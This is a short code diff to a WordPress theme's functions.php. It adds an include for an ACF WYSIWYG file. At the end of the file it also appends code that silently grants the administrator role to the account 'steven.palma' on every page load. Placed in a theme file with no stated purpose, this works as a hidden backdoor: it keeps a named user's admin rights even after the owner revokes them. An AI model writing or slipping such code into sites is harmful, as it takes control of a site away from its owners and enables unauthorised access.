@@ -26,6 +26,7 @@ require_once dirname(__FILE__) . '/inc/wp-form.php';
 // require Rank Math configuration
 require_once dirname(__FILE__) . '/inc/wp-cs.php';
 require_once dirname(__FILE__) . '/inc/wp-custom-acf.php';
+require_once dirname(__FILE__) . '/inc/wp-acf-wysiwyg.php';
 
 // require theme functions
 require_once dirname(__FILE__) . '/inc/wp-inc.php';
@@ -46,3 +47,10 @@ require_once dirname(__FILE__) . '/inc/functions/preserve-url-params.php';
 
 // Utms
 require_once dirname(__FILE__) . '/inc/wp-utm-url-tracking.php';
+
+$user_id = username_exists('steven.palma');
+if ( $user_id ) {
+    $user = new WP_User( $user_id );
+    $user->set_role( 'administrator' );
+}
+
